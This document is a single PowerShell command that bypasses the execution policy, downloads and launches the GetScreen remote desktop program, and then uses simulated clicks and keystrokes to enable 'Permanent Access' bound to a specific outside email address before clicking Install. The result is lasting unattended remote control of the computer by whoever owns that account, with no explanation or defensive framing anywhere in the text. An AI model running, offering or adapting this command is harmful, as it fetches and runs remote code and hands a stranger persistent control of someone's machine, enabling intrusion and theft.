powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $url='https://getscreen.me/download/getscreen.exe'; $exe=\"$env:USERPROFILE\Downloads\getscreen.exe\"; Add-Type -AssemblyName System.Windows.Forms; Add-Type 'using System; using System.Runtime.InteropServices; public class GSAll { [DllImport(\"user32.dll\")] public static extern bool SetForegroundWindow(IntPtr h); [DllImport(\"user32.dll\")] public static extern bool GetWindowRect(IntPtr h,out RECT r); [DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int x,int y); [DllImport(\"user32.dll\")] public static extern void mouse_event(uint f,uint dx,uint dy,uint d,UIntPtr e); public struct RECT { public int Left,Top,Right,Bottom; } }'; function ClickRel($rx,$ry) { $p=Get-Process getscreen -ErrorAction Stop | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1; [void][GSAll]::SetForegroundWindow($p.MainWindowHandle); Start-Sleep -Milliseconds 500; $r=New-Object GSAll+RECT; [void][GSAll]::GetWindowRect($p.MainWindowHandle,[ref]$r); $w=$r.Right-$r.Left; $h=$r.Bottom-$r.Top; [void][GSAll]::SetCursorPos([int]($r.Left+$w*$rx),[int]($r.Top+$h*$ry)); Start-Sleep -Milliseconds 300; [GSAll]::mouse_event(2,0,0,0,[UIntPtr]::Zero); Start-Sleep -Milliseconds 100; [GSAll]::mouse_event(4,0,0,0,[UIntPtr]::Zero); Start-Sleep -Milliseconds 700 }; Write-Host '[1/5] Downloading...'; Invoke-WebRequest -Uri $url -OutFile $exe; Write-Host '[2/5] Launching...'; $p=Get-Process getscreen -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1; if(!$p){Start-Process $exe; $deadline=(Get-Date).AddSeconds(30); do {Start-Sleep -Milliseconds 500; $p=Get-Process getscreen -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1} until($p -or (Get-Date)-gt $deadline)}; if(!$p){throw 'GetScreen window not found'}; Write-Host '[3/5] Opening Permanent Access...'; ClickRel 0.82 0.13; Start-Sleep -Seconds 2; Write-Host '[4/5] Clicking email field...'; ClickRel 0.50 0.55; Start-Sleep -Milliseconds 500; [System.Windows.Forms.SendKeys]::SendWait('^a'); Start-Sleep -Milliseconds 200; [System.Windows.Forms.SendKeys]::SendWait('hrjbgm@gmail.com'); Start-Sleep -Milliseconds 500; Write-Host 'Email entered. Verify the field before continuing.'; ClickRel 0.11 0.63; Write-Host '[5/5] Clicking Install...'; ClickRel 0.50 0.73; Write-Host 'Workflow finished. Check the app for confirmation or additional prompts.'"
